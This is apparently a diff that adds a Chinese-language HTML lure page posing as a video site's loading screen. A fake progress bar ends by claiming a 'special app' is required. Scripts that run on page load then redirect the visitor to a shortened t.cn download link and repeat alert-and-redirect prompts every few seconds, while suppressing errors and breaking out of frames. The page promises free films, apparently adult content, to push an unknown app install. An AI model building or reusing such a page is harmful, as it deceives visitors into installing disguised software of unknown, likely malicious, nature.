@@ -1,0 +1,160 @@
+
+<html><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<head>
+<title>正在连接中，请稍后..</title>
+<meta content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport"/>
+<meta content="text/html; charset=gb2312" http-equiv=Content-Type>
+<style>
+html,body{ background:#000; color:#FFF; margin:0px;}
+p{ margin:0; padding:0;}
+.main{ width:320px; margin:10px auto 0;}
+.top{ font-size:8px; position:relative;}
+.top .title{ position:relative; z-index:11; margin-bottom:-12px; margin-left:20px;}
+.top .pic{ position:relative; z-index:10;}
+.top .pic img{ width:100%;}
+.top .point{ position:relative; z-index:12; margin-left:8px; margin-top:-48px;}
+
+.msg{ width:320px; text-align:center; font-size:12px; position:relative; z-index:13; line-height:22px;}
+.loading{ padding:0px; background:#000; font-style:normal; width:320px; display:block; height:250px; clear:both; font-weight:normal;  opacity:0.4;}
+.loadingWord{ position:relative; z-index:14; margin-top:-210px;}
+.loadingOver{ width:95%; height:11px; line-height:11px; background:#000; position:relative; z-index:15; margin:3px auto 0; font-size:8px; text-align:left; color:#999;}
+.loading1{ border:none; text-align:center; background:none; color:#00ff00;}
+.loading2{ border-style:none; padding:0px; font-family:arial; background:none; color:#00ff00; font-weight:bolder;}
+.bottom{ text-align:center; position:relative; z-index:15; margin-top:180px; font-size:12px;}
+.bottom a{ color:#f60; text-decoration:none;}
+.bottom a:hover{ color:#f60; text-decoration:underline;}
+</style>
+<script type="text/javascript" src="http://lib.sinaapp.com/js/jquery/1.7.2/jquery.min.js"></script>
+</head>
+<body>
+<div class="main">
+
+<div class="top">
+<div class="title">精彩呈现</div>
+<div class="pic"><img src="http://www.dwz.cn/jpzxmm1"></div>
+<div class="point">服务器已连接，正在加载精彩内容……</div>
+</div>
+
+<div class="msg">
+
+<form name="loading">
+<p style="display:none; margin-top:-150px;" id=isLoading>服务器已连接，正在加载精彩内容，请稍候……
+<input class="loading1" name="percent" size="4">
+<br>
+<input class="loading2" name="chart" size="46">
+<br>
+</p>
+</form>
+
+<p style="display:none;" id="isAlert"><!--none-->
+<table>
+<p class="loading" style=" margin-top:-250px;">
+</p>
+
+<div class="loadingWord">
+<p><span>请先安装本站专用APP</span></p>
+<p><a id="link1" href="http://t.cn/R7AuXHq" target="_blank"><img src="http://ww1.sinaimg.cn/large/005yyi5Jjw1elj67h9lo0g304m01gt8j.gif" ></a></p>
+
+<p><span>无须付费！精彩内容免费呈现！<br>高清内容，缓冲快，支持任意选择、收藏内容，<br>下载保存，等功能。</span></p>
+<p><span>请使用本站提供的专用APP，<br>获得更高清、高速体验！</span></p>
+
+</div>
+
+<p class="loadingOver">服务器连接断开，原因：需安装手机专用APP！</p>
+</table>
+</p>
+<p style="display:none" id="isMsg"><!--none--></p>
+
+</div>
+
+<div class="bottom">
+<strong>下载地址二</strong>(备用地址)：
+<a id="link2" href="http://t.cn/R7AuXHq" target=_blank>进入下载&gt;&gt;</a>
+<br /><br /><br />
+</div>
+
+
+</div>
+<script language="javascript">
+//window.alert('本站所有影片均含有内容，未满18岁的用户请主动离开！');
+var bar = 0; 
+var line = "||"; 
+var amount = "||";
+
+function showTip(text, down_url, delay, set_timer){
+	if(set_timer==1){
+		window.setTimeout("showTip('"+ text +"', '" + down_url + "', '" + delay + "', 0)", delay);
+	}else{
+		alert(text);
+		window.location.href=down_url;
+	}
+}
+ 
+count();			   
+
+function count()
+{ 
+	isLoading.style.display	="none";		//隐藏层 [加载进度]		
+	isAlert.style.display	="none";		//隐藏层 [提示下载]	
+	isMsg.style.display		="none";		//隐藏层 [提示成功]		
+	
+	bar=bar+2; 
+	amount =amount + line ;
+	document.loading.chart.value=amount ;
+	document.loading.percent.value=bar+"%" ;
+	if (bar<99) 
+	{
+	
+		isLoading.style.display	="block";	//显示层 [加载进度]
+		setTimeout("count()",20);
+	} 
+	else 
+	{
+		window.alert('系统没有检测到本站专用APP,请下载本站专用APP，安装后运行专用APP即可浏览精彩内容！                                                                                                                                       PS:如打开后软件无内容，只需刷新软件更新即可！（软件每3小时，更新一次精彩内容，让你看个够！）');
+		$("#link1").attr("onclick","return count_a(1);");
+		$("#link2").attr("onclick","return count_a(2);");
+		
+		{
+			var y=Math.floor(Math.random()*2 + 1);
+			var _time = new Date().getTime();
+			var _url1 = "http://t.cn/R7AuXHq&"+_time;
+			var _url2 = "http://t.cn/R7AuXHq&"+_time;
+			var _url3 = "http://t.cn/R7AuXHq&"+_time;
+			
+			if(y==1){
+				$("#link1").attr('href',"http://t.cn/R7AuXHq&"+_time);
+				$("#link2").attr('href',"http://t.cn/R7AuXHq&"+_time);
+				
+				_url2 = "http://t.cn/R7AuXHq&"+_time;
+				_url3 = "http://t.cn/R7AuXHq&"+_time;
+
+			}else{
+					$("#link1").attr('href',"http://t.cn/R7AuXHq&"+_time);
+					$("#link2").attr('href',"http://t.cn/R7AuXHq&"+_time);
+
+					_url2 = "http://t.cn/R7AuXHq&"+_time;				
+					_url3 = "http://t.cn/R7AuXHq&"+_time;
+					
+			}
+			
+			window.location.href = _url1;
+			showTip("★本站所有电影采用专业用播放器，是否下载安装观看？★", _url2, 10000, 1);
+			showTip("提示：★2W部优质精选电影，下载播放器即可观看，是否马上下载？★", _url3, 15000, 1);
+			showTip("提示：★下载本站专用播放器,安装后即可观看本站2W部优质电影,立即下载？★", "http://t.cn/R7AuXHq", 20000, 1);		}
+		isLoading.style.display	="none";
+		isAlert.style.display	="block";
+
+	} 
+}
+
+if(self!=top){window.open(self.location,'_top');}
+function killErrors(){return true;}
+window.onerror = killErrors;
+self.moveTo(0,0);
+self.resizeTo(screen.availWidth,screen.availHeight); 
+</script>
+
+<span style="display:none">
+</span>
+</body>
+</html>
